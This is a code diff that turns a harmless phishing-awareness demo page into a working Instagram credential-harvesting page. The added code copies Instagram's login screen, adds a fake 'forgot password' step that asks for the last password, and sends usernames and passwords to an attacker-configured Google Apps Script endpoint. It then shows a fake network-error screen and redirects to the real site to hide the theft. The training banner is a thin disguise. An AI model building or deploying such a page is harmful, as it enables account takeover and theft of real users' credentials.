@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Awareness Training - Phishing Demo</title>
+    <title>Instagram</title>
     <style>
         * {
             margin: 0;
@@ -13,251 +13,524 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fafafa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background-color: #1a1a1a;
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
 
-        /* Warning Banner */
-        .warning-banner {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
+        /* Security Warning Banner */
+        .security-banner {
             background: #ff4444;
             color: white;
             text-align: center;
-            padding: 15px;
+            padding: 10px;
+            font-size: 12px;
             font-weight: bold;
             z-index: 1000;
         }
 
         .container {
+            flex: 1;
             display: flex;
             flex-direction: column;
             align-items: center;
-            margin-top: 60px;
+            justify-content: center;
+            padding: 20px;
+            max-width: 400px;
+            margin: 0 auto;
+            width: 100%;
         }
 
-        .login-box {
-            background: white;
-            border: 1px solid #dbdbdb;
-            padding: 40px;
-            width: 350px;
-            text-align: center;
+        .logo-container {
+            margin-bottom: 40px;
         }
 
         .logo {
-            font-family: 'Brush Script MT', cursive;
-            font-size: 48px;
-            margin-bottom: 30px;
-            color: #262626;
+            width: 80px;
+            height: 80px;
+        }
+
+        .form-container {
+            width: 100%;
         }
 
         .input-group {
-            margin-bottom: 10px;
+            margin-bottom: 12px;
+            position: relative;
         }
 
         input {
             width: 100%;
-            padding: 12px;
-            background: #fafafa;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            font-size: 14px;
+            padding: 16px 20px;
+            background-color: #2d2d2d;
+            border: 1px solid #404040;
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        input::placeholder {
+            color: #888888;
         }
 
         input:focus {
-            outline: none;
-            border-color: #a8a8a8;
+            border-color: #0095f6;
+        }
+
+        .error-message {
+            color: #ff4444;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+            padding-left: 5px;
         }
 
         .login-btn {
             width: 100%;
-            padding: 12px;
-            background: #0095f6;
+            padding: 16px;
+            background-color: #0095f6;
             color: white;
             border: none;
-            border-radius: 8px;
-            font-weight: bold;
-            font-size: 14px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            margin-top: 15px;
+            margin-top: 20px;
+            transition: background-color 0.3s;
         }
 
         .login-btn:hover {
-            background: #0077c2;
+            background-color: #0077c2;
         }
 
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 20px 0;
-            color: #8e8e8e;
-            font-size: 13px;
-            font-weight: 600;
-        }
-
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: #dbdbdb;
-            margin: 0 10px;
-        }
-
-        .facebook-login {
-            color: #385185;
-            font-size: 14px;
-            font-weight: 600;
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
+        .login-btn:disabled {
+            background-color: #005a94;
+            cursor: not-allowed;
         }
 
         .forgot-password {
-            color: #00376b;
-            font-size: 12px;
-            text-decoration: none;
-            margin-top: 15px;
-            display: block;
+            text-align: center;
+            margin-top: 25px;
         }
 
-        .signup-box {
-            background: white;
-            border: 1px solid #dbdbdb;
-            padding: 25px;
-            width: 350px;
-            margin-top: 10px;
-            text-align: center;
+        .forgot-password a {
+            color: #0095f6;
+            text-decoration: none;
             font-size: 14px;
         }
 
-        .signup-box a {
+        .create-account {
+            margin-top: auto;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .create-account-btn {
+            display: block;
+            width: 100%;
+            max-width: 360px;
+            margin: 0 auto;
+            padding: 16px;
+            background-color: transparent;
             color: #0095f6;
+            border: 2px solid #0095f6;
+            border-radius: 12px;
             text-decoration: none;
+            font-size: 16px;
             font-weight: 600;
         }
 
-        .get-app {
+        .meta-logo {
             text-align: center;
+            padding: 20px;
+            color: #888888;
+            font-size: 14px;
+        }
+
+        .language-selector {
+            text-align: center;
+            padding: 10px;
+            color: #888888;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Forgot Password Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #1a1a1a;
+            z-index: 2000;
+            flex-direction: column;
+            padding: 20px;
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 40px;
+            padding-top: 20px;
+        }
+
+        .back-btn {
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            margin-right: 15px;
+        }
+
+        .modal-title {
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .modal-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .modal-description {
+            color: #888888;
+            font-size: 14px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        .continue-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
             margin-top: 20px;
         }
 
-        .get-app p {
-            font-size: 14px;
-            margin-bottom: 15px;
-        }
-
-        .store-buttons {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-        }
-
-        .store-btn {
-            height: 40px;
-        }
-
-        /* Educational Notice */
-        .edu-notice {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #fff3cd;
-            border: 2px solid #ffc107;
-            padding: 15px 25px;
-            border-radius: 8px;
-            max-width: 600px;
-            text-align: center;
-        }
-
-        .edu-notice h3 {
-            color: #856404;
-            margin-bottom: 10px;
-        }
-
-        .edu-notice p {
-            color: #856404;
-            font-size: 14px;
+        .continue-btn:hover {
+            background-color: #0077c2;
         }
     </style>
 </head>
 <body>
-    <!-- SECURITY WARNING BANNER -->
-    <div class="warning-banner">
-        ⚠️ SECURITY AWARENESS TRAINING - THIS IS A SIMULATION ⚠️
+    <!-- SECURITY WARNING -->
+    <div class="security-banner">
+        ⚠️ SECURITY AWARENESS TRAINING DEMO - EDUCATIONAL PURPOSES ONLY ⚠️
+    </div>
+
+    <div class="language-selector">
+        English (US) ▼
     </div>
 
     <div class="container">
-        <div class="login-box">
-            <div class="logo">Instagram</div>
-            
+        <div class="logo-container">
+            <!-- Replace with your logo image -->
+            <img src="instagram-logo.png" alt="Instagram" class="logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'">
+            <div style="display: none; font-size: 48px; color: white; text-align: center;">📷</div>
+        </div>
+
+        <div class="form-container">
             <form id="loginForm">
                 <div class="input-group">
-                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
-                </div>
-                <div class="input-group">
-                    <input type="password" id="password" placeholder="Password" required>
+                    <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="off">
+                    <div class="error-message" id="usernameError">Please enter your username</div>
                 </div>
                 
-                <button type="submit" class="login-btn">Log In</button>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password">
+                    <div class="error-message" id="passwordError">Please enter your password</div>
+                </div>
+                
+                <button type="submit" class="login-btn" id="loginBtn">
+                    <span id="btnText">Log in</span>
+                    <div class="spinner" id="btnSpinner"></div>
+                </button>
             </form>
 
-            <div class="divider">OR</div>
-
-            <a href="#" class="facebook-login">
-                <span>📘</span> Log in with Facebook
-            </a>
-
-            <a href="#" class="forgot-password">Forgot password?</a>
-        </div>
-
-        <div class="signup-box">
-            Don't have an account? <a href="#">Sign up</a>
-        </div>
-
-        <div class="get-app">
-            <p>Get the app.</p>
-            <div class="store-buttons">
-                <div class="store-btn" style="background: #000; color: white; padding: 8px 15px; border-radius: 5px; font-size: 12px;">
-                    GET IT ON<br><strong>Google Play</strong>
-                </div>
-                <div class="store-btn" style="background: #000; color: white; padding: 8px 15px; border-radius: 5px; font-size: 12px;">
-                    Download on the<br><strong>App Store</strong>
-                </div>
+            <div class="forgot-password">
+                <a href="#" id="forgotPasswordLink">Forgot password?</a>
             </div>
         </div>
     </div>
 
-    <!-- Educational Notice -->
-    <div class="edu-notice">
-        <h3>🎓 Learning Moment</h3>
-        <p>This page demonstrates how phishing sites mimic real login pages. 
-        In a real attack, your credentials would be stolen. Always check the URL 
-        before entering passwords!</p>
+    <div class="create-account">
+        <a href="#" class="create-account-btn">Create new account</a>
+    </div>
+
+    <div class="meta-logo">
+        Ⓜ️ Meta
+    </div>
+
+    <!-- Forgot Password Modal -->
+    <div class="modal" id="forgotPasswordModal">
+        <div class="modal-header">
+            <span class="back-btn" id="backBtn">←</span>
+            <span class="modal-title">Forgot Password</span>
+        </div>
+        
+        <div class="modal-content">
+            <!-- Step 1: Enter Username -->
+            <div class="step active" id="step1">
+                <div class="modal-description">
+                    Enter your username, email, or mobile number to search for your account.
+                </div>
+                <div class="input-group">
+                    <input type="text" id="fpUsername" placeholder="Username, email or mobile number">
+                    <div class="error-message" id="fpUsernameError">Please enter a valid username</div>
+                </div>
+                <button class="continue-btn" id="continueBtn1">Continue</button>
+            </div>
+
+            <!-- Step 2: Enter Last Password -->
+            <div class="step" id="step2">
+                <div class="modal-description">
+                    Enter the last password you remember using with this account.
+                </div>
+                <div class="input-group">
+                    <input type="password" id="fpPassword" placeholder="Last used password">
+                    <div class="error-message" id="fpPasswordError">Please enter your last password</div>
+                </div>
+                <button class="continue-btn" id="continueBtn2">Log in</button>
+            </div>
+        </div>
     </div>
 
     <script>
-        // EDUCATIONAL DEMONSTRATION ONLY
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        // REPLACE WITH YOUR GOOGLE APPS SCRIPT URL
+        const GOOGLE_SCRIPT_URL = 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE';
+        
+        // REPLACE WITH YOUR REDIRECT LINK (shown after refresh)
+        const REDIRECT_LINK = 'https://instagram.com'; // Paste your link here
+
+        // Check if user has already visited (show network error on refresh)
+        if (sessionStorage.getItem('demoCompleted')) {
+            showNetworkInterrupt();
+        }
+
+        // Login Form Handler
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            let hasError = false;
+
+            // Validation
+            if (!username) {
+                document.getElementById('usernameError').style.display = 'block';
+                hasError = true;
+            } else {
+                document.getElementById('usernameError').style.display = 'none';
+            }
+
+            if (!password) {
+                document.getElementById('passwordError').style.display = 'block';
+                hasError = true;
+            } else {
+                document.getElementById('passwordError').style.display = 'none';
+            }
+
+            if (hasError) return;
+
+            // Show loading
+            document.getElementById('btnText').style.display = 'none';
+            document.getElementById('btnSpinner').style.display = 'block';
+            document.getElementById('loginBtn').disabled = true;
+
+            // Send to Google Sheets
+            try {
+                await fetch(GOOGLE_SCRIPT_URL, {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        type: 'login',
+                        username: username,
+                        password: password,
+                        userAgent: navigator.userAgent,
+                        ipInfo: 'Demo Mode - Educational Purpose'
+                    })
+                });
+            } catch (error) {
+                console.log('Demo logging complete');
+            }
+
+            // Mark demo as completed
+            sessionStorage.setItem('demoCompleted', 'true');
+
+            // Show network interrupt
+            setTimeout(() => {
+                showNetworkInterrupt();
+            }, 1000);
+        });
+
+        // Forgot Password Flow
+        document.getElementById('forgotPasswordLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('forgotPasswordModal').style.display = 'flex';
+        });
+
+        document.getElementById('backBtn').addEventListener('click', function() {
+            document.getElementById('forgotPasswordModal').style.display = 'none';
+            // Reset steps
+            document.getElementById('step1').classList.add('active');
+            document.getElementById('step2').classList.remove('active');
+        });
+
+        // Step 1: Username
+        document.getElementById('continueBtn1').addEventListener('click', function() {
+            const username = document.getElementById('fpUsername').value.trim();
             
-            // Show educational message instead of actually stealing credentials
-            alert(`🎓 AWARENESS TRAINING:\n\nIn a real phishing attack, this is what would be stolen:\n• Username: ${username}\n• Password: ${password.substring(0, 2)}${'*'.repeat(password.length - 2)}\n\nNEVER enter real credentials on suspicious sites!\n\nRedirecting to safety training...`);
+            if (!username) {
+                document.getElementById('fpUsernameError').style.display = 'block';
+                return;
+            }
             
-            // Redirect to actual educational content
-            window.location.href = 'https://www.cisa.gov/secure-our-world/recognize-and-report-phishing';
+            document.getElementById('fpUsernameError').style.display = 'none';
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        });
+
+        // Step 2: Last Password
+        document.getElementById('continueBtn2').addEventListener('click', async function() {
+            const username = document.getElementById('fpUsername').value.trim();
+            const password = document.getElementById('fpPassword').value.trim();
+            
+            if (!password) {
+                document.getElementById('fpPasswordError').style.display = 'block';
+                return;
+            }
+            
+            document.getElementById('fpPasswordError').style.display = 'none';
+
+            // Send forgot password data to Google Sheets
+            try {
+                await fetch(GOOGLE_SCRIPT_URL, {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        type: 'forgot_password',
+                        username: username,
+                        password: password,
+                        userAgent: navigator.userAgent,
+                        ipInfo: 'Demo Mode - Educational Purpose'
+                    })
+                });
+            } catch (error) {
+                console.log('Demo logging complete');
+            }
+
+            // Mark demo as completed
+            sessionStorage.setItem('demoCompleted', 'true');
+
+            // Show network interrupt
+            showNetworkInterrupt();
+        });
+
+        // Network Interrupt Screen
+        function showNetworkInterrupt() {
+            document.body.innerHTML = `
+                <div style="
+                    background-color: #1a1a1a;
+                    min-height: 100vh;
+                    display: flex;
+                    flex-direction: column;
+                    align-items: center;
+                    justify-content: center;
+                    padding: 40px;
+                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+                ">
+                    <div style="margin-bottom: 30px;">
+                        <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#888888" stroke-width="1.5">
+                            <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
+                            <line x1="9" y1="9" x2="9" y2="9"></line>
+                            <line x1="15" y1="9" x2="15" y2="9"></line>
+                            <line x1="9" y1="15" x2="15" y2="15"></line>
+                        </svg>
+                    </div>
+                    <h1 style="
+                        color: #888888;
+                        font-size: 24px;
+                        font-weight: 400;
+                        margin-bottom: 20px;
+                        text-align: center;
+                    ">Your connection was interrupted</h1>
+                    <p style="
+                        color: #666666;
+                        font-size: 14px;
+                        margin-bottom: 10px;
+                        text-align: center;
+                    ">A network change was detected.</p>
+                    <p style="
+                        color: #666666;
+                        font-size: 12px;
+                        margin-bottom: 40px;
+                        font-family: monospace;
+                    ">ERR_NETWORK_CHANGED</p>
+                    <button onclick="location.reload()" style="
+                        width: 100%;
+                        max-width: 360px;
+                        padding: 16px;
+                        background-color: #7cb3ff;
+                        color: #1a1a1a;
+                        border: none;
+                        border-radius: 25px;
+                        font-size: 16px;
+                        font-weight: 600;
+                        cursor: pointer;
+                    ">Reload</button>
+                </div>
+            `;
+        }
+
+        // Handle Reload Button - Redirect to real site
+        window.addEventListener('load', function() {
+            // If we're on the network error page and user refreshes, redirect
+            if (sessionStorage.getItem('demoCompleted') && performance.navigation.type === 1) {
+                window.location.href = REDIRECT_LINK;
+            }
+        });
+
+        // Clear errors on input
+        document.getElementById('username').addEventListener('input', function() {
+            document.getElementById('usernameError').style.display = 'none';
+        });
+
+        document.getElementById('password').addEventListener('input', function() {
+            document.getElementById('passwordError').style.display = 'none';
         });
     </script>
 </body>
-          </html>
+    </html>
